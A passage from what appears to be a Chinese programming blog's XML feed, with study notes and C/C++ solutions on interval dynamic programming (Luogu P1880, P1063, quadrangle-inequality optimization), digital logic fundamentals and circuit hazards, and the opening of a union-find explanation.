= <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (front != rear &amp;&amp; a[que[rear - <span class="number">1</span>]] &lt;= a[i])</span><br><span class="line">            rear--;</span><br><span class="line">        que[rear++] = i;</span><br><span class="line">        <span class="keyword">if</span> (que[front] &lt;= i - k)</span><br><span class="line">            front++;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[que[front]]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>特殊数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>特殊数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>区间dp</title>
    <url>/2021/09/27/%E5%8C%BA%E9%97%B4dp/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​    区间dp就是在区间上进行动态规划，求一段区间上的最优解。即通过循环来合并小区间的最优解进而得到大区间上的最优解。</p>
<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>​    结合注释，模板应该很容易看懂</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span>;len&lt;=n;len++)<span class="comment">//枚举区间长度</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j+len&lt;=n;j++)<span class="comment">//枚举区间起点</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ends=j+len<span class="number">-1</span>;<span class="comment">//通过当前区间起点和长度计算区间终点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=j;i&lt;ends;i++)<span class="comment">//枚举断点</span></span><br><span class="line">            dp[j][ends]=max(dp[j][ends],dp[j][i]+dp[i+<span class="number">1</span>][ends]+w[i][ends])</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//上面的dp[i][j]表示区间长度从i到j对应的值</span></span><br></pre></td></tr></table></figure>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="洛谷P1880-石子合并"><a href="#洛谷P1880-石子合并" class="headerlink" title="洛谷P1880 石子合并"></a>洛谷P1880 石子合并</h2><h3 id="题目如下"><a href="#题目如下" class="headerlink" title="题目如下"></a>题目如下</h3><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210928134212729.png" alt="image-20210928134212729"></p>
<h3 id="简要思路"><a href="#简要思路" class="headerlink" title="简要思路"></a>简要思路</h3><p>​    感觉区间dp更多的就像是一种套路，然后其中比较难的题目大概就是有环，以及如何去将$O(n^3)$优化到$O(n^2)$的想法</p>
<p>​    首先先来处理这个环，其实对于这个环状结构，如果我们想要枚举所有的区间，只需要让所有数据在当前结尾再重复一遍即可，然后其实状态转移方程就非常明显了，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dp[j][ends]=max(dp[j][ends],dp[j][i]+dp[i+<span class="number">1</span>][ends]+w[j][ends])</span><br></pre></td></tr></table></figure>
<p>​    对于这里的$w[j][ends]$，其实指的就是添加断点后，要将两个区间中的合并所增加的质量，为了避免在这里再增加一次循环，我们可以利用前缀和的方法，来在输入的过程中将所有的和给保存起来即可，详见代码</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-27 19:43:47 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-27 20:21:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//区间dp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">105</span>];</span><br><span class="line"><span class="comment">// int dpmin[205][205];</span></span><br><span class="line"><span class="comment">// int dpmax[202][202];</span></span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">int</span> dpmin[<span class="number">205</span>][<span class="number">205</span>];</span><br><span class="line">    <span class="keyword">int</span> dpmax[<span class="number">202</span>][<span class="number">202</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dpmin, <span class="number">1000000</span>, <span class="keyword">sizeof</span>(dpmin));</span><br><span class="line">    <span class="built_in">memset</span>(dpmax, INT_MIN, <span class="keyword">sizeof</span>(dpmax));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">        sum[i] = sum[i - <span class="number">1</span>] + a[i];</span><br><span class="line">        dpmin[i][i] = <span class="number">0</span>;</span><br><span class="line">        dpmax[i][i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum[i + n] = sum[i + n - <span class="number">1</span>] + a[i];</span><br><span class="line">        dpmin[i + n][i + n] = <span class="number">0</span>;</span><br><span class="line">        dpmax[i + n][i + n] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">1</span>; len &lt;= n;len++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j + len &lt;= <span class="number">2</span> * n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ends = len + j - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = j; i &lt; ends;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                dpmin[j][ends] = min(dpmin[j][ends], (dpmin[j][i] + dpmin[i + <span class="number">1</span>][ends] + sum[ends] - sum[j - <span class="number">1</span>]));</span><br><span class="line">                dpmax[j][ends] = max(dpmax[j][ends], dpmax[j][i] + dpmax[i + <span class="number">1</span>][ends] + sum[ends] - sum[j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ansmin = <span class="number">100000</span>;</span><br><span class="line">    <span class="keyword">int</span> ansmax = INT_MIN;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ansmax&lt;dpmax[i][i+n<span class="number">-1</span>])</span><br><span class="line">            ansmax = dpmax[i][i + n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">if</span>(ansmin&gt;dpmin[i][i+n<span class="number">-1</span>])</span><br><span class="line">            ansmin = dpmin[i][i + n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n%d&quot;</span>, ansmin, ansmax);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洛谷P1063-能量锁链"><a href="#洛谷P1063-能量锁链" class="headerlink" title="洛谷P1063 能量锁链"></a>洛谷P1063 能量锁链</h2><h3 id="题目如下-1"><a href="#题目如下-1" class="headerlink" title="题目如下"></a>题目如下</h3><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210928140031556.png" alt="image-20210928140031556"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​    又是一个循环区间上的dp，需要注意的是，这里面所有的珠子在合并之后头部是区间最开始的头部，尾部是区间最后的尾部，所以其实这里是不需要借助前缀和数组来找到划分区间过程中增加的能量的，所以还是需要仔细分析读题。</p>
<h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-27 20:25:30 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-27 21:14:26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//区间dp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) ((a) &gt; (b) ? (a) : (b))</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">202</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">205</span>][<span class="number">205</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">-1</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]), a[n + i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i][i] = <span class="number">0</span>;</span><br><span class="line">        dp[i + n][i + n] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">2</span>; len &lt;= n; len++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j + len &lt;= <span class="number">2</span> * n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ends = j + len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = j; i &lt; ends; i++)</span><br><span class="line">                dp[j][ends] = max(dp[j][ends], dp[j][i] + dp[i + <span class="number">1</span>][ends] + a[j] * a[i + <span class="number">1</span>] * a[ends + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ansmax = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ansmax = max(ansmax, dp[i][i + n - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, ansmax);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="时间优化"><a href="#时间优化" class="headerlink" title="时间优化"></a>时间优化</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​    注意到，我们在找寻最佳分割点的时候浪费了较多的时间，所以其实我们可以在查找的时候将最优分割点保存下来，进而优化时间效率</p>
<h2 id="理论：四边形不等式"><a href="#理论：四边形不等式" class="headerlink" title="理论：四边形不等式"></a>理论：四边形不等式</h2><p>​    主要用来寻找$s[i][j]$与其他分割点的关系，其中$s[i][j]$表示从$i$到$j$的最优分割点。</p>
<p>​    四边形不等式指的是如果某东西满足$a&lt;b\leqslant c&lt;d$，并且$f[a][c]+f[b][d]\leqslant f[a][d]+f[b][c]$，则称其满足四边形不等式，可以形象理解为两个交叉区间的和不超过小区间和大区间的和</p>
<p>​    另外需要给出所谓的区间包含的单调性这一概念，即如果对于$i\leqslant i^<code>&lt;j \leqslant j^</code>$，有$f[i^<code>][j]\leqslant f[i][j^</code>]$，则称其具有区间包含的单调性</p>
<p>​    然后四边形不等式优化有三步，对于这样的一个状态转移方程$dp[i][j]=min_{k=i}^{j-1}\{dp[i][k]+dp[k+1][j]+w[i][j]\}$，首先第一步，证明$w[i][j]$满足四边形不等式且具有区间包含的单调性，第二部证明$dp[i][j]$满足四边形不等式，第三步，设$s[i][j]=k$，表示区间$[i,j]$，的最优分割点为$k$，证明，$s[i][j-1]\leqslant s[i][j] \leqslant s[i+1][j]$</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>​    以之前的合并石子为例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10000+10</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[MAXN][MAXN],s[MAXN][MAXN],cnt[MAXN];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;cnt[i]),cnt[i]=cnt[i<span class="number">-1</span>]+cnt[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i][i]=<span class="number">0</span>;s[i][i]=i; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">register</span> <span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp=<span class="number">0x7fffffff</span>;</span><br><span class="line">            <span class="keyword">int</span> te;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=s[i][j<span class="number">-1</span>];k&lt;=s[i+<span class="number">1</span>][j];k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp&gt;dp[i][k]+dp[k+<span class="number">1</span>][j]+cnt[j]-cnt[i<span class="number">-1</span>])&#123;</span><br><span class="line">                    temp=dp[i][k]+dp[k+<span class="number">1</span>][j]+cnt[j]-cnt[i<span class="number">-1</span>];</span><br><span class="line">                    te=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j]=temp;</span><br><span class="line">            s[i][j]=te;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>动态规划</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>基本知识和组合逻辑</title>
    <url>/2021/12/15/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E5%92%8C%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91/</url>
    <content><![CDATA[<h1>基础知识</h1>
<h2 id="进制"><a class="header-anchor" href="#进制">¶</a>进制</h2>
<ol>
<li>二进制的三种编码，原码、补码、反码，注意反码计算的时候如果符号位有进位，需要将其进到最低位</li>
<li>二进制小数转换成十进制采用乘二取整</li>
</ol>
<h2 id="编码"><a class="header-anchor" href="#编码">¶</a>编码</h2>
<ol>
<li>
<p>8421码对0-9进行编码，和其对应的二进制一样，应注意和二进制的区别，如${(28)}<em>{10}=$${(11100)}</em>{2}=$${(00101000)}_{8421}$</p>
</li>
<li>
<p>2421码的0-4和8421码一样，5-9是从1011开始的，其实就是${(a_3a_2a_1a_0)}<em>{2421}={(2a_3+4a_2+2a_1+a_0)}</em>{2421}$，另外2421码是一种对9的自补编码，即将某数对应的2421码按位取反就能得到对9的补数的2421码</p>
</li>
<li>
<p>余3码是在8421码的基础上每一个加0011得到的，也是对9的自补编码，注意计算和的时候需要对结果进行修正，<strong>即如果没有进位，需要对结果减3，如果有进位，需要对结果加3</strong></p>
</li>
<li>
<p>格雷码，任意两位相邻的十进制数，格雷码仅有一位不同，转换规则如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170120691.png" alt="image-20220326170120691"></p>
</li>
<li>
<p>奇偶校验码由两部分组成，即信息位和奇偶检验位，奇校验是让信息位和检验位中有奇数个1，偶校验是让他们之中有偶数个1</p>
</li>
</ol>
<h1>逻辑代数基础</h1>
<h2 id="基本知识"><a class="header-anchor" href="#基本知识">¶</a>基本知识</h2>
<p><strong>大部分都可以掠过，就写一些比较重要的</strong></p>
<ol>
<li>
<p>代入规则，代入的是整体</p>
</li>
<li>
<p>反演规则，即将所有的全部改变，要注意运算符的优先级</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170150471.png" alt="image-20220326170150471"></p>
</li>
<li>
<p>对偶规则，和反演规则差不多，但是只有把或变与，把与变或，然后把0变1，把1变0，主要是利用对偶规则去简化问题</p>
</li>
<li>
<p>在多个变量异或时，<strong>若有奇数个变量为1，则最终结果为1，否则为0</strong>，同或运算和异或运算是完全反着来的</p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170212099.png" alt="image-20220326170212099"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170232752.png" alt="image-20220326170232752"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170252729.png" alt="image-20220326170252729"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170336000.png" alt="image-20220326170336000"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170355384.png" alt="image-20220326170355384"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170421151.png" alt="image-20220326170421151"></p>
<h2 id="逻辑表达式的变换"><a class="header-anchor" href="#逻辑表达式的变换">¶</a>逻辑表达式的变换</h2>
<h3 id="最大项和最小项"><a class="header-anchor" href="#最大项和最小项">¶</a>最大项和最小项</h3>
<ol>
<li>最小项指的就是包含$n$个变量的与项的式子，可以是变量本身或其反变量，只能出现一次，记为$m_i$，其中下标$i$一般指的是按变量顺序将最小项中的原变量用1表示，反变量用0表示，得到的二进制数就是$i$的值，相邻最小项指的是两个最小项中仅有一个变量互反，剩余全部相同，有如下性质：
<ul>
<li>只有一种取值使其为真</li>
<li>两个不同最小项相与为0</li>
<li>所有最小项或起来为1</li>
<li>n个变量构成的最小项有n个相邻最小项</li>
</ul>
</li>
<li>最大项和最小项相对，只是把与项改成了或项，记为$M_i$，其中$i$的取值是按照变量顺序，让原变量为0，反变量为1，得到的二进制数，所有的性质都是最小项的对偶版本，此略</li>
<li>最大项和最小项有互补关系，即$\overline{m_i}=M_i$</li>
<li>标准与或表达式和标准或与表达式指的就是用最小项和最大项进行表示</li>
</ol>
<h3 id="代数化简法"><a class="header-anchor" href="#代数化简法">¶</a>代数化简法</h3>
<ol>
<li>
<p>要求标准与或表达式，其实就是先将其化成一般与或表达式，然后利用$X=X(Y+\overline)$，</p>
</li>
<li>
<p>要求标准或与表达式，先将其转化成一般或与表达式，然后用$X=(X+Y)(X+\overline{Y})$</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326170443136.png" alt="image-20220326170443136"></p>
<p>注意其中的$A+BC=(A+B)(A+C)$</p>
</li>
</ol>
<h3 id="真值表法"><a class="header-anchor" href="#真值表法">¶</a>真值表法</h3>
<p>​	真值表法思路其实很简单，但是就是麻烦</p>
<p>​	首先先将真值表列出来，然后找到让函数值为1的变量取值，这些其实就是该函数的标准与或表达式中的最小项。或与表达式完全相对，此略</p>
<h2 id="逻辑表达式的化简"><a class="header-anchor" href="#逻辑表达式的化简">¶</a>逻辑表达式的化简</h2>
<h3 id="代数法"><a class="header-anchor" href="#代数法">¶</a>代数法</h3>
<ol>
<li>
<p>最简与或表达式，要求表达式中的与项个数最少，同时每个与项中的变量数最少，主要利用以下几个定理</p>
<ul>
<li><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214194348279.png" alt="image-20211214194348279"></li>
<li><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214194412848.png" alt="image-20211214194412848"></li>
<li><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214194546430.png" alt="image-20211214194546430"></li>
<li><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214194630824.png" alt="image-20211214194630824"></li>
</ul>
</li>
<li>
<p>或与表达式的化简，和与或表达式是对偶的，这里可以参考<strong>两次对偶法</strong>：</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214194953100.png" alt="image-20211214194953100"></p>
</li>
</ol>
<h3 id="卡诺图化简法"><a class="header-anchor" href="#卡诺图化简法">¶</a>卡诺图化简法</h3>
<ol>
<li>
<p>卡诺图中每一个方格代表一个最小项，几何图形上处在相邻、相对、相重位置的小方格所代表的最小项为相邻最小项</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214200418696.png" alt="image-20211214200418696"></p>
</li>
<li>
<p>在卡诺图上可以直观的找到相邻最小项合并</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214201220847.png" alt="image-20211214201220847"></p>
</li>
<li>
<p>蕴含项：与或表达式中的与项。质蕴含项：该蕴含项不是其他蕴含项的子集，对应的就是函数卡诺图中不能被更大的圈包围的圈。必要质蕴含项：包含至少一个函数不被其他质蕴含项包括的最小项</p>
</li>
<li>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214201848460.png" alt="image-20211214201848460"></p>
</li>
<li>
<p>上面给出的是求最简与或表达式，要求最简或与表达式，需要使用两次取反法</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214203605776.png" alt="image-20211214203605776"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214203632586.png" alt="image-20211214203632586"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214203704627.png" alt="image-20211214203704627"></p>
</li>
</ol>
<h1>组合逻辑电路</h1>
<p>​	组合逻辑电路是电路输出仅仅取决于当前输入的电路</p>
<h2 id="组合逻辑电路分析"><a class="header-anchor" href="#组合逻辑电路分析">¶</a>组合逻辑电路分析</h2>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214210738145.png" alt="image-20211214210738145"></p>
<h2 id="组合逻辑电路设计"><a class="header-anchor" href="#组合逻辑电路设计">¶</a>组合逻辑电路设计</h2>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211214211157279.png" alt="image-20211214211157279"></p>
<p>​	一般其实更多的是列出真值表，写出标准与或表达式，然后用卡诺图去化简。</p>
<p>​	有一个名词是<strong>无关项</strong>，用意大概存在某种现实情况使得当前最小项的取值是无所谓的，这个时候的输出函数的值是多少都无所谓，通常记为<strong>d</strong>，通常可以给无关项一些特定的值，来让逻辑表达式更加简洁，如问题<strong>判断余3码表示的0-9的数是否是合数</strong>，中间显然有一些最小项是无关项，这个时候给他们一些特定的值，可以更加简洁</p>
<p>​	还有一种更常见的题目是多输出的组合逻辑电路的设计，这种一般都是要通过代数化简，让多个输出之间有共享的部分，从而减少使用的逻辑门的数量</p>
<p>​	另外，在设计的时候，相关的输出函数大概率会需要原变量的反变量，这个时候直接取反在效率上会比较低，所以可以使用相关的代数处理，来使用与非门或或非门来进行取反</p>
<h2 id="组合逻辑电路的险象"><a class="header-anchor" href="#组合逻辑电路的险象">¶</a>组合逻辑电路的险象</h2>
<p>​	主要是因为时间延迟造成的问题</p>
<h3 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h3>
<p>​	竞争现象指的是输入信号经过不同的路径到达输出端的时间长短有先有后，非临界竞争指的是不会产生错误输出的竞争，临界竞争指的是会产生错误输出的竞争，<strong>险象</strong>指的是由竞争导致出现的错误信号，是一种瞬态现象，表现为输出端产生不应该有的尖脉冲，<strong>静态现象</strong>指的是输入变化而输出不应该发生变化的情况下出现的短暂错误，<strong>动态险象</strong>指的是输入变化而输出应该发生变化的情况下出现的短暂错误，同时也有0型险象和1型险象的区别</p>
<h3 id="判断"><a class="header-anchor" href="#判断">¶</a>判断</h3>
<p>​	主要有代数法和卡诺图法。</p>
<p>​	代数法指的就是先查看函数中是否同时存在原变量和它的反变量，然后再看是否能通过对其它变量赋特殊值来让函数中出现$X+\overline{X}$或$X*\overline{X}$的形式。</p>
<p>​	当逻辑表达式是与或表达式的时候，用卡诺图会更简单一些，大概就是画出卡诺图后，看一下各与项对应的卡诺全是否有相切的，如果有，就可能出现险象</p>
<h3 id="消除"><a class="header-anchor" href="#消除">¶</a>消除</h3>
<ol>
<li>
<p>可以增加冗余项，主要思路是首先找出当其余的变量取值为几时会产生哪种类型的险象，然后通过增加该变量的冗余项，使得取该值时不发生这种险象就行</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215103459231.png" alt="image-20211215103459231"></p>
<p>另外也可以使用卡诺图，即在相切的地方加圈。</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215103650220.png" alt="image-20211215103650220"></p>
</li>
<li>
<p>增加惯性延时环节，略</p>
</li>
<li>
<p>选通法，略</p>
</li>
</ol>
<h1>一些小知识</h1>
<ol>
<li>三态门，当EN=1时正常工作，否则无法工作</li>
</ol>
]]></content>
      <categories>
        <category>数字逻辑</category>
      </categories>
      <tags>
        <tag>数字逻辑</tag>
      </tags>
  </entry>
  <entry>
    <title>并查集</title>
    <url>/2021/08/16/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    <content><![CDATA[<h1>概述</h1>
<ol>
<li>并查集是一种树形的数据结构，主要用来解决不相交集合间的合并和查询的问题，比如可以用它来判断森林中有几棵树、某个结点是否属于某个树</li>
<li>主要由一个整型数组pre[]和两个函数find()、join()构成</li>
<li>可以用来求连通分支数</li>
</ol>
<h1>现实意义</h1>
<h2 id="大概的含义"><a class="header-anchor" href="#大概的含义">¶</a>大概的含义</h2>
<p><strong>以下的有趣的解释摘自CSDN博主酱懵静</strong></p>
<p>**原文链接：**<a href="https://blog.csdn.net/the_ZED/article/details/105126583">https://blog.csdn.net/the_ZED/article/details/105126583</a></p>
<hr>
<p>故事引入：<br>
话说在江湖中散落着各式各样的大侠，他们怀揣着各自的理想和信仰在江湖中奔波。或是追求武林至尊，或是远离红尘，或是居庙堂之高，或是处江湖之远。尽管大多数人都安分地在做自己，但总有些人会因为彼此的信仰不同而聚众斗殴。因此，江湖上常年乱作一团，纷纷扰扰。<br>
这样长期的混战，难免会打错人，说不定一刀就把拥有和自己相同信仰的队友给杀了。这该如何是好呢？于是，那些有着相同信仰的人们便聚在一起，进而形成了各种各样的门派，比如我们所熟知的“华山派”、“峨嵋派”、“,崆峒派”、“少林寺”、“明教”……这样一来，那些有着相同信仰的人们便聚在一起成为了朋友。以后再遇到要打架的事时，就不会打错人了。</p>
